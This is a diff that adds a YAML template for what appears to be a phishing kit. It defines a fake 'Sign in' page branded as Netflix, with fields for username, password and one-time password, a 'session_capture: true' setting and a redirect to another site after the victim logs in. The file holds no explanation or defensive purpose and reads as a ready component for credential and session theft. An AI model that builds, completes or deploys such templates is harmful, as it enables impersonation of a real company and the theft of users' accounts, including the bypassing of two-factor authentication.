@@ -1,0 +1,38 @@
+name: "Generic Login Page"
+author: "Sheikh-CoedexTech"
+version: "1.0"
+
+page_title: "Sign in to your account"
+company_name: "Netflix"
+logo_url: ""
+favicon_url: ""
+redirect_after: "https://example.com/dashboard"
+
+fields:
+  - id: username
+    name: username
+    label: Username or Email
+    type: text
+    placeholder: "Enter your username"
+    required: true
+  - id: password
+    name: password
+    label: Password
+    type: password
+    placeholder: "Enter your password"
+    required: true
+  - id: otp
+    name: otp_code
+    label: One-Time Password
+    type: text
+    placeholder: "Enter OTP from authenticator"
+    required: false
+
+session_capture: true
+session_capture_method: direct
+
+branding:
+  primary_color: "#0066ff"
+  secondary_color: "#0052cc"
+  company_logo: ""
+  custom_css: ""
